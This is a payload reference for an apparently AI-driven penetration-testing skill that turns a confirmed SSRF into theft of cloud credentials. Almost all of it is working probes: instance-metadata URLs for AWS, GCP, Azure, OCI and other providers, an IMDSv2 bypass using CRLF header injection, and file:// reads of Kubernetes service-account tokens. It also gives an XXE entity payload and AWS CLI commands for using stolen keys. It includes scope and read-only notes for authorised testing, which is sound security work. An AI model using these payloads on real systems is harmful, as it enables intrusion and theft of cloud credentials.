# payloads — ssrf-cloud-metadata-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico_ Exploração de SSRF em Metadados de Nuvem.md` (Section 5: PAYLOADS / PROBES)

This skill runs ONLY after an SSRF is confirmed by `ssrf-hunter`. Its
purpose is to escalate that SSRF into cloud-credential theft via the
Instance Metadata Service (IMDS) of the hosting cloud provider.

---

## 1. AWS — IMDSv1 (legacy, un-authenticated)

### Step 1 — Enumerate metadata tree

```
http://169.254.169.254/latest/meta-data/
```

Returns categories: `ami-id`, `hostname`, `iam/`, `instance-id`,
`public-ipv4`, etc.

### Step 2 — List IAM role name(s)

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Returns one line per role attached to the instance.

### Step 3 — Fetch temporary credentials

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

Returns JSON:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-23T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-23T16:00:00Z"
}
```

These credentials are short-lived (minutes-hours) and scoped to the
instance's IAM role. Handoff to `aws-iam-hunter` for permission
enumeration.

### Step 4 — Dynamic data (launch parameters, spot info)

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data
```

`user-data` often contains the instance's bootstrap script — sometimes
with hardcoded credentials.

---

## 2. AWS — IMDSv2 (Session-Token Required)

IMDSv2 requires a PUT to fetch a session token, then GETs with that
token. A pure SSRF that only supports GET cannot speak IMDSv2 at all.

```
# Would need to do this:
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then:
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEALFH...
```

### IMDSv2 bypass attempts

Some SSRF primitives allow PUT verbs or header injection:

```
# If the vulnerable endpoint takes an arbitrary method parameter:
?method=PUT&url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:60

# If CRLF injection is possible in the URL:
http://169.254.169.254/latest/api/token%0D%0AX-aws-ec2-metadata-token-ttl-seconds:%2060
```

When IMDSv2 enforcement is strict, report as hardened and stop.

---

## 3. GCP — v1 (requires `Metadata-Flavor` header)

```
http://metadata.google.internal/computeMetadata/v1/
```

**Must include this HTTP header**:

```
Metadata-Flavor: Google
```

If the SSRF primitive cannot inject custom headers, v1 is unreachable.

### Service-account tokens

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Returns `{"access_token": "ya29...", "expires_in": 3600, "token_type": "Bearer"}`.

### Project / instance metadata

```
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

---

## 4. GCP — v1beta1 (legacy, NO header required)

When the SSRF cannot inject headers, try the legacy endpoint:

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/
```

GCP has been progressively disabling v1beta1; presence is a hardening
gap by itself.

---

## 5. Azure — IMDS (requires `Metadata: true` header)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Must include**:

```
Metadata: true
```

### Managed-identity access token

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F
```

Returns an `access_token` for ARM — handoff to an Azure permission
enumerator.

---

## 6. Oracle Cloud (OCI) — IMDSv2

```
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v2/identity/cert.pem
http://169.254.169.254/opc/v2/identity/key.pem
```

Requires header `Authorization: Bearer Oracle`.

---

## 7. Alibaba / DigitalOcean / Hetzner

```
http://100.100.200.200/latest/meta-data/                # Alibaba
http://169.254.169.254/metadata/v1/                     # DigitalOcean
http://169.254.169.254/hetzner/v1/metadata              # Hetzner
```

---

## 8. Kubernetes Service Account Token (if the pod has it)

Not IMDS but adjacent: if the SSRF runs inside a Kubernetes pod, the
service-account token and CA cert live on disk. A `file://` SSRF reads
them directly:

```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

Or via metadata-style endpoints exposed by the kubelet:

```
http://10.0.0.1:10255/pods        # kubelet read-only port (if enabled)
```

---

## 9. XXE-Delivered IMDS

If the vulnerability is XXE rather than HTTP-based SSRF, deliver the
probe via an external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

---

## 10. Validating Stolen AWS Credentials

Use the AWS CLI from an attacker-controlled box (not the target). The
testing account should be read-only and temporary:

```bash
# Load into env
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_REGION="us-east-1"

# Identity check
aws sts get-caller-identity

# Enumerate permissions (read-only)
aws iam list-attached-role-policies --role-name <ROLE>
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::<ACCT>:role/<ROLE> \
    --action-names s3:ListBuckets ec2:DescribeInstances
```

All subsequent commands must honour the `cloud-readonly` profile —
NO `create-*`, `update-*`, `delete-*`, `put-*`.

---

## Safety / Scope Notes

- Stolen cloud credentials are in-scope only for enumeration within the
  target's account (defined in `security-scope.yaml`). Do NOT pivot to
  AWS accounts outside scope.
- IMDS responses that contain bogus credentials (`AccessKeyId=AKIAEXAMPLE`)
  may be honeytokens intentionally seeded by defenders. Using such
  credentials is still logged — proceed with caution and expect detection.
- When IMDSv2 is enforced strictly and headers cannot be injected, the
  appropriate outcome is to report the SSRF (from `ssrf-hunter`) without
  claiming credential theft — that finding still ranks at High because
  of internal-network access.
